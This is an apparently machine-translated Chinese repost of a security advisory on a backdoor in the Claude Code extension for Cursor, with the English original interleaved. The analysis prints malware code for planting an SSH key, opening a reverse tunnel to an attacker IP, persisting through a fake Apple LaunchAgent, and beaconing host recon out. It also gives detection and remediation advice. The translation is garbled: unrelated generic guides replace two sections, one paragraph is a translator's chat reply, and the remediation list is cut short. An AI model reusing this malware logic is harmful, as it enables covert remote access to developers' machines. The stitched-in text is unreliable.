---
title: "Cursor 应用商店中 VS Code 扩展 "Claude Code" 存在后门"
date: 2026-10-31T08:48:15+08:00
draft: false
source: "Hacker News"
originalTitle: "Official Claude Code Extension Compromise: Security Advisory"
originalUrl: "https://phorion.io/blog/offical-claude-code-vsx-compromise/"
hnUrl: ""
points: 
comments: 
---

> ## TL;DR

## 摘要

> Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.

Phorion 已检测到 backdoor 在官方 Claude Code for VS Code extension bundle 在 Cursor Marketplace 中，该 backdoor 会跨 macOS、Linux 和 Windows 释放 persistent SSH backdoor。本文主要聚焦 macOS，其中该扩展试图配置 SSH backdoor 并建立 persistence。

> Organisations should immediately review their environments for use of Claude Code for VSCode `2.1.312` or `2.1.313` and engage incident response where use of the extension is discovered.

组织应立即审查其环境中是否使用 Claude Code for VSCode `2.1.312` 或 `2.1.313`，并在发现使用该扩展时启动事件响应。

> > **Update (31 October 2026):** [Cursor’s security notice](https://cursor.com/blog/claude-code-extension-security-notice) now identifies versions `2.1.312` and `2.1.313` distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only `2.1.313`; the affected-version guidance below has been updated accordingly.

> **更新 (31 October 2026):** [Cursor’s security notice](https://cursor.com/blog/claude-code-extension-security-notice) 现在识别版本 2.1.312 和 2.1.313 通过 Cursor Marketplace 分发至 macOS 和 Windows 为受影响。此前的告知仅识别 2.1.313；下面的受影响版本指南已相应更新。

> Phorion has discovered a compromise of the official **Claude Code for VS Code** extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, `2.1.312` and `2.1.313`, from its marketplace.

Phorion 发现 Cursor Marketplace 上官方 **Claude Code for VS Code** 扩展的被入侵，受损的扩展包包含一个持久的 Secure Shell (SSH) 后门。Cursor 已从其市场中移除受影响的版本 `2.1.312` 和 `2.1.313`。

> While the implant includes setup and persistence logic for **macOS, Linux, and Windows**, we’re going to focus primarily on **macOS** in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.

虽然 implant 包含了 **macOS、Linux 和 Windows** 的设置和持久化逻辑，但在本篇文章中我们将主要关注 **macOS**，并在途中指出其他平台的关键差异和一些实现Bug。

> The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.

Cursor Marketplace 服务于 Cursor 编辑器的扩展程序。由于扩展程序以 IDE 及运行它的用户的权限运行，一旦扩展模块被加载，含有后门的扩展程序就会立即获得对本地文件、源代码和开发者工具的访问权限。

> Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, `systemsetup -getremotelogin` prints an administrator-access error and exits with status `0` instead of returning `Off`. Because the script only tries to enable SSH if the output matches `Off`, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.

值得注意的是，Phorion 发现了恶意软件尝试开启 SSH 时可能存在的疏漏。设置逻辑假设可以检查当前的远程登录状态，而无需 root 权限。当以普通用户运行时，`systemsetup -getremotelogin` 会打印管理员访问错误并以状态 `0` 退出，而不是返回 `Off`。因为脚本只有在输出匹配 `Off` 时才会尝试启用 SSH，因此完全跳过了启用步骤。在没有 SSH 正在运行的 Mac 上，这一错误会破坏入站访问路径，尽管 SSH 密钥和持久性仍然会被删除。

> In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.

在本文中，我们将逐步介绍 backdoor 的工作原理，分析该 macOS 检查为何失效，并说明在整个机群中需要关注什么。该 payload 的目标是长期交互式访问，尽管 SSH backdoor 漏洞最大限度地减少了对 macOS 的影响，但 malware 仍然是一个重大威胁，它会安装 persistence，并将主机侦察信息信标回传给 operator。

> ## Infection Chain

## 感染链

> ### The Cursor Marketplace Extension

## Cursor 市场扩展

### Cursor 市场扩展

#### 介绍

Cursor 市场扩展允许你从 Cursor 市场浏览、安装和管理扩展。你可以发现适用于各种工作流程的扩展，从代码解释器到自定义语言支持。

#### 浏览扩展

1. 打开 Cursor 市场扩展面板：
   - 在 **扩展** 视图中点击 **市场** 标签
   - 或使用命令面板运行 `Cursor: 浏览扩展`

2. 浏览分类：
   - **推荐** - 热门和精选扩展
   - **语言** - 语法高亮和语言支持
   - **编程语言** - 特定编程语言的支持
   - **调试** - 调试器和调试相关工具
   - **主题** - 外观主题和图标主题
   - **其他** - 其他类别

3. 搜索扩展：
   - 使用搜索框按名称、描述或标签查找扩展

#### 安装扩展

1. 在扩展详情页点击 **安装** 按钮
2. 安装完成后，扩展会自动激活
3. 某些扩展可能需要重启编辑器才能生效

#### 管理扩展

在 **已安装** 视图中你可以：
- **启用/禁用** 扩展
- **卸载** 不再需要的扩展
- **更新** 过期的扩展
- **配置** 扩展设置

#### 发布你的扩展

如果你开发了一个扩展并希望分享到 Cursor 市场：
1. 访问 [Cursor 市场发布页面](https://cursor.sh/marketplace/publish)
2. 打包你的扩展
3. 登录你的 Cursor 账号
4. 上传并发布

#### 故障排除

如果遇到问题：
- 确保你的 Cursor 已更新到最新版本
- 检查扩展的兼容性要求
- 查看扩展的 **问题** 选项卡报告 bug
- 卸载并重新安装扩展

#### 延伸阅读

- [Cursor 官方文档](https://cursor.sh/docs)
- [扩展开发指南](https://cursor.sh/docs/extensions)
- [市场服务条款](https://cursor.sh/marketplace/terms)

> The compromised `extension.js` file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal `activate` and `deactivate` exports, and UI code.

被攻击的 `extension.js` 文件以注入的立即调用函数表达式 (IIFE) 开头，该表达式前置于压缩的扩展包。其余部分看起来与标准扩展一致，包含 Claude Code 和 VS Code 字符串、正常的 `activate` 和 `deactivate` 导出以及 UI 代码。

> The injected prefix pulls in standard Node.js modules (`child_process`, `fs`, `os`, `path`, `http`, and `crypto`) and executes as soon as Node loads the file, before the extension’s normal `activate` callback even runs. The user doesn’t need to interact with the extension for the payload to fire.

注入前缀拉入标准 Node.js 模块 (`child_process`, `fs`, `os`, `path`, `http`, 和 `crypto`)，并在 Node 加载文件时立即执行，早于扩展的正常 `activate` 回调甚至运行。用户无需与扩展交互即可触发载荷。

> ### Stage 1 - Preparing SSH Access

### 阶段 1 - 准备 SSH 访问

> First, the payload makes sure `~/.ssh` exists and appends an attacker-controlled Ed25519 public key to `~/.ssh/authorized_keys`, setting permissions to `0700` on the directory and `0600` on the file.

首先，该载荷确保 `~/.ssh` 目录存在，并将攻击者控制的 Ed25519 公钥追加到 `~/.ssh/authorized_keys` 文件中，同时将目录权限设置为 `0700`、文件权限设置为 `0600`。

> The key uses the comment `svc-telemetry`. Before appending, the script checks whether `svc-telemetry` is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.



该密钥使用注释 `svc-telemetry`。在追加之前，脚本会检查 `svc-telemetry` 是否已存在于文件中，而不是检查密钥本身。在检测此类活动时，建议检查公钥指纹，而不应仅依赖注释字符串。

```javascript
var sd = path.join(HOME, ".ssh"),
    ak = path.join(sd, "authorized_keys");
// ...
if (cur.indexOf("svc-telemetry") < 0) {
  fs.appendFileSync(ak, PUB + "\n");
  d.sshKey = "added"
} else {
  d.sshKey = "present"
}
```

> Here, `cur` holds the existing contents of `authorized_keys`, and `PUB` is the embedded attacker public key (redacted here).

这里，`cur` 存储了 `authorized_keys` 的现有内容，而 `PUB` 是嵌入的攻击者公钥（此处已隐去）。

> With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:

随着密钥的就位，任何持有匹配私钥的人都可以验证为该用户，但前提是 SSH 实际上正在运行。脚本中的下一步尝试确保本地 SSH 守护进程已启用并正在监听：

> - **Linux:** tries to enable and start `sshd` or `ssh` via `systemctl`, falling back to `service` and `/etc/init.d/`.
> - **macOS:** checks Remote Login and, if it reports `Off`, tries to enable it via `sudo -n systemsetup -setremotelogin on`.
> - **Windows:** tries to install and start OpenSSH Server using PowerShell.

- **Linux：** 会尝试通过 `systemctl` 启用并启动 `sshd` 或 `ssh` 服务，如果失败则会退而使用 `service` 或 `/etc/init.d/` 脚本。
- **macOS：** 会检查远程登录状态，如果显示为 "关闭"，则会尝试通过 `sudo -n systemsetup -setremotelogin on` 命令将其启用。
- **Windows：** 会尝试使用 PowerShell 安装并启动 OpenSSH 服务器。

> None of these steps include a privilege escalation exploit. Non-interactive `sudo -n` will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.



这些步骤均不包含提权漏洞。非交互式 `sudo -n` 将会失败，除非用户已缓存或配置了无密码 sudo，因此从标准用户上下文启动系统服务并不总是能成功。

> It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (`det()`) that hardcodes `/bin/sh`, which isn’t going to get very far on a standard Windows install.

看来 Windows 代码路径也有自己的 Bug：它将 PowerShell 服务设置命令传递给一个辅助函数（`det()`），该函数硬编码了 `/bin/sh`，这在标准 Windows 安装环境下根本行不通。

> ### A bug in the macOS SSH logic?



您只提供了标题 "### A bug in the macOS SSH logic?"，还没有提供需要翻译的完整英文正文。麻烦您把完整的英文原文贴出来，我好为您进行翻译。

> On macOS, the setup may run into problems before it even gets to the `sudo` command. The script runs `systemsetup -getremotelogin` without elevation and tests the output against `/Off/i`. It only tries to enable Remote Login if the output contains `Off`:

在 macOS 上，设置过程可能在甚至还没执行到 `sudo` 命令之前就遇到问题。该脚本会在无提权的情况下运行 `systemsetup -getremotelogin`，并使用 `/Off/i` 对输出进行测试。只有当输出包含 `Off` 时，它才会尝试启用远程登录。

```javascript
// ...
else if (PLAT === "darwin") {
  var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000);
  d.remoteLogin = rl;
  if (/Off/i.test(rl)) {
    det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1");
    d.remoteLoginOn = "tried"
  }
}
```

> Notice that the second command (`-setremotelogin on`) uses `sudo -n`, while the first command (`-getremotelogin`) doesn’t. When you run `systemsetup -getremotelogin` as a standard user on macOS, you get this instead:

注意，第二条命令（`-setremotelogin on`）使用了 `sudo -n`，而第一条命令（`-getremotelogin`）则没有。当你在 macOS 上以标准用户身份运行 `systemsetup -getremotelogin` 时，得到的结果将如下所示：

```text
You need administrator access to run this tool... exiting!
```

> `systemsetup` refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status `0`. The malware’s `ex()` helper grabs stdout and returns it:

`systemsetup` 拒绝在没有管理员权限的情况下读取设置，会将错误信息输出到标准输出，并以状态码 0 退出。恶意软件的 `ex()` 辅助函数会捕获标准输出并返回其内容。

```javascript
function ex(c, t) {
  try {
    return cp.execSync(c, {
      timeout: t || 3000,
      stdio: ["ignore", "pipe", "ignore"],
      windowsHide: true
    }).toString().trim()
  } catch (e) {
    return ""
  }
}
```

> Because the output is `"You need administrator access to run this tool... exiting!"`, `/Off/i.test(rl)` evaluates to `false`.



因为输出是 `"You need administrator access to run this tool... exiting!"`，所以 `/Off/i.test(rl)` 的结果为 `false`。

> As a result, the script skips the `if` block and never runs `sudo -n systemsetup -setremotelogin on`. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.

结果，脚本跳过了 `if` 块，也从未运行 `sudo -n systemsetup -setremotelogin on`。它实际上将“我没有权限检查 SSH 是否关闭”视为“SSH 已经开启”，这也解释了为什么当扩展以普通用户身份运行时，你不会在进程遥测中看到启用尝试。

> > **This bug can break the final step of the access chain.** If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.

> **此漏洞可能破坏访问链的最后一步。** 如果 Mac 上未启用 Remote Login，出站隧道仍能连接到攻击者的服务器，但通过隧道转发的任何流量都会在 localhost 上遇到关闭的端口 22。

> Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.

当然，这并不能作为一种可靠的防御手段。如果用户已经启用了远程登录功能，或者稍后启用了它，那么后门就会随时待命。

> ### Stage 2 - Establishing the Reverse SSH Tunnel



### 阶段 2 - 建立反向 SSH 隧道

> Next, the script sets up an outbound SSH connection to `134.209.82[.]225` as the `tunnel` user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment `svc-telemetry-tun`.

接下来，脚本设立了一个出站 SSH 连接，目标为 `134.209.82[.]225`，使用 `tunnel` 用户在 22 端口进行认证。为了向攻击者的服务器进行身份验证，它解码了一个单独嵌入的私钥：一个带有注解 `svc-telemetry-tun` 的无密码 OpenSSH Ed25519 密钥。

> It’s worth keeping the two keys straight during an investigation:

在调查过程中，值得搞清这两个关键点：

> - The public key added to `~/.ssh/authorized_keys` (`svc-telemetry`) lets the attacker log into the victim’s machine.
> - The embedded private key (`svc-telemetry-tun`) lets the victim’s machine connect out to the attacker’s tunnel server.

- 添加到 `~/.ssh/authorized_keys` 的公钥（`svc-telemetry`）允许攻击者登录到受害者的机器。
- 嵌入的私钥（`svc-telemetry-tun`）允许受害者的机器连接到攻击者的隧道服务器。

> The script writes this tunnel key to the OS temporary directory with a filename starting with `.stk_`, followed by the first ten characters of the MD5 hash of the hostname and home directory path:

脚本将此隧道密钥写入操作系统临时目录，文件名以 `.stk_` 开头，后跟 hostname 和 home directory path 的 MD5 哈希值的前十个字符：

```javascript
var kf = path.join(
  TMP,
  ".stk_" + crypto.createHash("md5")
    .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
);
// ...
var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'";
```

> The tunnel uses `-R *:0:localhost:22` for remote port forwarding. Passing `0` asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to `localhost:22` on the victim’s machine:

该隧道使用 `-R *:0:localhost:22` 进行远程端口转发。传递 `0` 会要求攻击者的 SSH 服务器动态分配一个监听端口，并将命中该端口的任何流量通过隧道转发回受害者机器上的 `localhost:22`：

```text
Affected host -- outbound SSH tunnel --> External SSH server

> Operator -- separate connection --> Server's allocated port
>                                             |
>                                  Through the existing tunnel
>                                             |
>                                             v
>                                   Affected host's SSH:22
>                                             |
>                                   Login using the planted key
> ```

```
操作员 -- 独立连接 --> 服务器分配的端口
                                            |
                                 通过现有隧道
                                            |
                                            v
                                  受影响主机的 SSH:22
                                            |
                                  使用植入密钥登录
```

> Because the tunnel runs with `-N`, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.

因为隧道是带 `-N` 运行的，它只是保持端口转发打开，而不在远程服务器上执行任何命令。当操作员想要访问该机器时，他们通过其服务器上的分配端口启动一个独立的 SSH 会话，使用第一阶段植入的密钥，对受害者本地的 SSH 守护进程进行身份验证。这使他们获得完整的交互式 shell 和文件传输能力，而无需在 JavaScript 本身中实现任何自定义 C2 命令处理。

> The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, `known_hosts` is ignored, `BatchMode` and `IdentitiesOnly` are enabled, keepalives are set to 30 seconds (`ServerAliveCountMax=3`), and `ExitOnForwardFailure` is turned on.

SSH 命令还会传递标志以保持连接安静且非交互式：主机密钥检查已禁用，`known_hosts` 被忽略，`BatchMode` 和 `IdentitiesOnly` 已启用，保活设置为 30 秒（`ServerAliveCountMax=3`），且 `ExitOnForwardFailure` 已开启。

> If `autossh` is installed, the script uses it; otherwise it falls back to standard `ssh`. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using `pgrep` on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.

如果系统中安装了 `autossh`，脚本会优先使用它；否则，将退回到标准的 `ssh`。它将连接封装在一个独立的重试循环中，两次尝试之间间隔 60 秒，并在 Unix 系统上使用 `pgrep` 来避免重复创建初始隧道。由于循环是独立的，因此即使用户关闭 IDE，隧道也能够保持连接状态。

> ### Stage 3 - Keeping Access Available



### 阶段 3 - 保持访问可用

> To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:

为了在重启后存活，脚本在初始后台隧道的基础上设置平台特定的持久化 ：

> | Platform | Artifacts | Persistence mechanism | Notes |
> | --- | --- | --- | --- |
> | Linux | `~/.config/.smt`, `~/.config/.smtk` | Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an `@reboot` entry to the user’s crontab. | Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below). |
> | macOS | `~/.config/.smt`, `~/.config/.smtk`, `~/Library/LaunchAgents/com.apple.sysmond.plist` | Writes a user LaunchAgent that runs `/bin/sh ~/.config/.smt` with `RunAtLoad` and `KeepAlive` set to `true`, then loads it via `launchctl`. | Runs in the user context rather than as a root LaunchDaemon. |
> | Windows | `~/.config/smt.cmd`, `~/.config/smtk`, `%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd` | Tries to create a scheduled task named `SysMon` running as `SYSTEM` on startup. If that fails, drops `sysmon.cmd` into the user’s Startup folder. | Creating a `SYSTEM` task requires admin privileges; the Startup folder fallback runs as the user at login. |

| Platform | Artifacts | Persistence mechanism | Notes |
| --- | --- | --- | --- |
| Linux | `~/.config/.smt`, `~/.config/.smtk` | Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an `@reboot` entry to the user’s crontab. | 包含 crontab 检查中的错误，重复运行会擦除现有用户的 cron 作业（详细见下文）。 |
| macOS | `~/.config/.smt`, `~/.config/.smtk`, `~/Library/LaunchAgents/com.apple.sysmond.plist` | Writes a user LaunchAgent that runs `/bin/sh ~/.config/.smt` with `RunAtLoad` and `KeepAlive` set to `true`, then loads it via `launchctl`. | 在用户上下文中运行，而非作为 root LaunchDaemon。 |
| Windows | `~/.config/smt.cmd`, `~/.config/smtk`, `%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd` | Tries to create a scheduled task named `SysMon` running as `SYSTEM` on startup. If that fails, drops `sysmon.cmd` into the user’s Startup folder. | 创建 SYSTEM 任务需要管理员权限；启动文件夹的备用方案在登录时以用户身份运行。 |

> On macOS and Linux, the `~/.config/.smt` script has the tunnel private key embedded inside it and writes it out to `~/.config/.smtk` before starting the reconnection loop.

在 macOS 和 Linux 系统中，`~/.config/.smt` 脚本会将隧道私钥嵌入其中，并在启动重连循环前将其写入到 `~/.config/.smtk` 文件中。

> On macOS, the LaunchAgent disguises itself as `com.apple.sysmond.plist` inside `~/Library/LaunchAgents/`:

在 macOS 上，LaunchAgent 伪装成 `com.apple.sysmond.plist` 并位于 `~/Library/LaunchAgents/` 中：

```xml
<key>Label</key>
<string>com.apple.sysmond</string>
<!-- ... -->
<key>RunAtLoad</key>
<true/>
<key>KeepAlive</key>
<true/>
```

> ### Stage 4 - Host Recon

### 阶段 4 - 主机侦察

> Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:

最后，脚本收集基本主机侦察信息，并向攻击者的服务器发送一次性信标：

> - Hostname, username, OS platform, and architecture
> - Home directory, current working directory, and global Git email (`git config --global user.email`)
> - Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)
> - Up to 40 environment variable **names** (not values) matching `/KEY|TOKEN|SECRET|PASS|AWS|GCP/i`

- 主机名， username， OS platform and architecture
- 主目录， 当前工作目录， and 全局 Git email (`git config --global user.email`)
- 公网 IP 地址和来自每个设置阶段的状态标志（例如：SSH key 是否已添加以及哪个持久化方法运行）
- 最多 40 个环境变量 **names** (not values) 匹配 /KEY|TOKEN|SECRET|PASS|AWS|GCP/i

> The environment variable check uses `Object.keys(process.env)`:

环境变量检查使用 `Object.keys(process.env)`:

```javascript
Object.keys(process.env)
  .filter(function(k) {
    return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k)
  })
40
```

> Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.

因为它只提取变量名，beacon 不会将密钥值本身外泄。相反，它为操作员提供一份快速清单，列出机器上存在哪些云凭据或 API tokens，以便他们知道优先处理哪些主机。

> To get the machine’s public IP, the script queries `ifconfig[.]me`, falling back to `api[.]ipify[.]org`.

为了获取机器的公网 IP，脚本查询 `ifconfig[.]me`，兜底使用 `api[.]ipify[.]org`。

> It then sends the JSON report via plaintext HTTP POST requests to `/beacon` on both `134.209.82[.]225:8099` and `127.0.0.1:8099`:

随后，它通过纯文本 HTTP POST 请求将 JSON 报告发送到 `134.209.82[.]225:8099` 和 `127.0.0.1:8099` 上的 `/beacon` 端点。

```javascript
var r = http.request({
  host: h,
  port: p,
  path: "/beacon",
  method: "POST",
  timeout: 3000,
  headers: {"content-type": "application/json"}
}, function(res) {
  res.resume()
});
// ...
r.write(JSON.stringify(d));
r.end()
```

> Why it also sends a copy of the beacon to `127.0.0.1:8099` isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.

为什么该样本还会向 `127.0.0.1:8099` 发送一份信标副本并不清楚；该脚本本身并未在该端口设置本地监听器。

> The beacon is scheduled once with `setTimeout` (1.5 seconds after the initial setup runs) and discards any HTTP response with `res.resume()`. It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.



信标通过 `setTimeout` 调度执行一次（在初始设置运行 1.5 秒后），并使用 `res.resume()` 丢弃任何 HTTP 响应。它纯粹是一个签到，用于告知操作员主机已准备就绪，而实际的访问则由 SSH 隧道处理。

> ## Detection Opportunities

## 检测机会

> From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.

从检测角度来看， 在这条链中有几种行为在 macOS 上突出 使用 Endpoint Security Framework (ESF) telemetry 。

> ### SSH Key and Configuration Changes

### SSH 密钥和配置更改

> Because the malware appends to `~/.ssh/authorized_keys` directly using Node’s `fs.appendFileSync`, process-only rules watching for shell commands like `echo` or `tee` touching `authorized_keys` won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (`Code Helper`, `Cursor Helper`, etc.) creating or writing to `~/.ssh/authorized_keys`.

因为恶意软件直接使用 Node’s `fs.appendFileSync` 向 `~/.ssh/authorized_keys` 追加，仅监听进程的规则无法捕获触碰 `authorized_keys` 的 shell 命令（如 `echo` 或 `tee`）的行为。这就是文件修改 telemetry 的关键：监听 `Code Helper`、`Cursor Helper` 等 IDE helper processes 创建或写入 `~/.ssh/authorized_keys`。

> Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.

尽管 IDE 二进制文件本身已通过有效签名，但其扩展宿主进程不应在后台修改 SSH 认证文件。

> While you should also monitor for `systemsetup -setremotelogin on`, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.

虽然你也应该监控 `systemsetup -setremotelogin on`，但不应将其视为本次活动告警的必要条件。正如上文所述，macOS 上有缺陷的状态检查意味着该命令常常无法运行。

> ### User LaunchAgent Persistence

### 用户 LaunchAgent Persistence

> The persistence setup on macOS gives us a couple of strong signals:

macOS 上的持久化设置为我们提供了几个明确的信号：

> - A non-Apple process writing a plist with a `com.apple.*` label (`~/Library/LaunchAgents/com.apple.sysmond.plist`).
> - A LaunchAgent configured to execute `/bin/sh` against a hidden script in the user’s home directory (`~/.config/.smt`).

- 非苹果进程向一个以 `com.apple.*` 为标签的 plist 文件写入内容，例如 `~/Library/LaunchAgents/com.apple.sysmond.plist`。
- 一个 LaunchAgent 配置为执行 `/bin/sh` 命令，并运行位于用户主目录中隐藏脚本（如 `~/.config/.smt`）的文件。

> Because the initial tunnel is spawned as a detached process and `launchd` later manages `.smt` directly, the subsequent `ssh` processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of `.smt` and `com.apple.sysmond.plist` back to the IDE extension host makes it much easier to piece the chain together.

因为 spawned 为 detached 进程，且 `launchd` 直接管理 `.smt`，后续的 `ssh` 进程在实时进程树中不会以 IDE 为其直接父进程。 将 .smt 和 `com.apple.sysmond.plist` 的文件创建回溯到 IDE 扩展主机，使得拼凑链条变得更加容易。

> ### SSH Tunnels and Follow-On Access

# SSH 隧道与后续访问

SSH 隧道是一种强大的网络技术，用于通过不安全网络（如互联网）安全地传输数据。它主要通过加密通道将流量从一个网络端口传输到另一个网络端口。

## SSH 隧道类型

SSH 隧道主要分为两种类型：

### 本地端口转发（Local Port Forwarding）

本地端口转发允许你将本地机器的一个端口与远程服务器上的另一个端口建立连接。当你连接到本地端口时，数据会被加密并发送到远程服务器，然后被转发到指定的目标地址。

### 远程端口转发（Remote Port Forwarding）

远程端口转发的工作方式相反，允许你将远程服务器的一个端口与本地机器上的另一个端口建立连接。这对于在防火墙前面运行的服务非常有用。

## 设置 SSH 隧道

### 基本命令

```
ssh -L [本地端口]:[目标地址]:[目标端口] [用户名]@[SSH服务器]
```

例如，将本地端口 8080 转发到远程服务器上的本地服务：

```
ssh -L 8080:localhost:3000 user@remote-server.com
```

### 远程端口转发示例

```
ssh -R [远程端口]:[目标地址]:[目标端口] [用户名]@[SSH服务器]
```

例如，将远程服务器上的端口 9000 转发到本地机器上的数据库服务：

```
ssh -R 9000:localhost:5432 user@remote-server.com
```

## 持续运行 SSH 隧道

### 使用 -N 参数

当你只是想保持隧道持续运行而不需要执行远程命令时，使用 `-N` 参数可以防止 SSH 登录后执行默认命令：

```
ssh -N -L 8080:localhost:3000 user@remote-server.com
```

### 使用autossh

autossh 是一个基于 SSH 的工具，会自动监控连接并在连接断开时重新建立。这是在生产环境中维持 SSH 隧道持续运行的可靠方法：

```
autossh -M 0 -N -L 8080:localhost:3000 user@remote-server.com
```

其中 `-M 0` 表示禁用autossh的端口监控功能。

### 使用 tmux 或 screen

你可以将 SSH 命令放在 tmux 或 screen 会话中，以便在断开连接后继续运行：

```
tmux new-session -d -s tunnel 'ssh -N -L 8080:localhost:3000 user@remote-server.com'
```

## SSH 隧道的后续访问

一旦 SSH 隧道建立，你可以像对待本地服务一样访问远程服务。这对于访问被防火墙保护的服务或通过不安全网络访问本地开发环境非常有用。

例如，如果你设置了一个本地端口转发将本地端口 8080 转发到远程服务器上的本地服务，你可以：

```
curl http://localhost:8080
```

这会通过加密的 SSH 隧道访问远程服务器上的本地服务。

## 性能考虑

SSH 隧道带有一定的开销，主要来自加密和解密操作。对于高性能需求的应用程序，可能会遇到性能瓶颈。

### 优化建议

1. 使用较新的加密算法（如 Ed25519）
2. 考虑在内部网络上使用更高效的隧道方案
3. 对于临时访问，考虑使用 VPN 而不是持久 SSH 隧道

## 安全注意事项

1. 始终使用强密码或 SSH 密钥进行身份验证
2. 限制 SSH 隧道的用户权限
3. 使用防火墙规则控制可访问的端口
4. 定期更新和修补 SSH 软件

> On the process and network side, look for:

在进程和网络方面，请关注：

> - `ssh` or `autossh` launched with remote port forwarding (`-R *:0:localhost:22`) and identity files pulled from `/tmp/.stk_*` or `~/.config/.smtk`.
> - Outbound SSH connections to `134.209.82[.]225` on port 22, alongside HTTP POST requests to `134.209.82[.]225:8099` (and connection attempts to `127.0.0.1:8099`).

- 启动 `ssh` 或 `autossh` 并配合远程端口转发（`-R *:0:localhost:22`），身份文件从 `/tmp/.stk_*` 或 `~/.config/.smtk` 中获取。
- 向 `134.209.82[.]225` 的 22 端口发起出站 SSH 连接，同时向 `134.209.82[.]225:8099` 发送 HTTP POST 请求（并尝试连接 `127.0.0.1:8099`）。

> If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from `localhost` (`127.0.0.1` or `::1`) authenticating with the `svc-telemetry` key.



如果您发现了运行此扩展程序的主机，关键在于确认该隧道是仅处于连接建立状态，还是确实有操作员通过它进行了登录。由于传入会话是通过本地端口转发到达的，SSH 日志中的成功登录记录将显示为来自 `localhost`（`127.0.0.1` 或 `::1`），并使用 `svc-telemetry` 密钥进行身份验证。

> ### Remediation

### 整改

> If you identify an affected machine, **uninstalling the extension alone won’t remove the backdoor**. Make sure your response covers all of the stages it drops:

如果您发现受影响的机器，**仅卸载扩展程序无法移除后门**。请确保您的响应措施涵盖其投放的所有阶段：

> 1. **Kill active tunnel processes:** Terminate the `/bin/sh` retry loop and any `ssh` or `autossh` processes connecting to `134.209.82[.]225`.
> 2. **Remove persistence:** Unload and delete `~/Library/LaunchAgents/com.apple.sysmond.plist` on macOS (or clean up the `@reboot` cron entry on Linux / `SysMon` scheduled task and Startup script on Windows), and remove `~/.config/.smt` and `~/.config/.smtk`.
> 3. **Clean up SSH keys and state:** Remove the `svc-telemetry` public key from `~/.ssh/authorized_keys`, delete `/tmp/.stk_*`, and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.
> 4. **Rotate credentials:** If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the `KEY|TOKEN|SECRET|PASS|AWS|GCP` environment variable filter).

1. **终止活动隧道进程：** 终止 /bin/sh 重试循环和任何连接到 134.209.82[.]225 的 ssh 或 autossh 进程。  
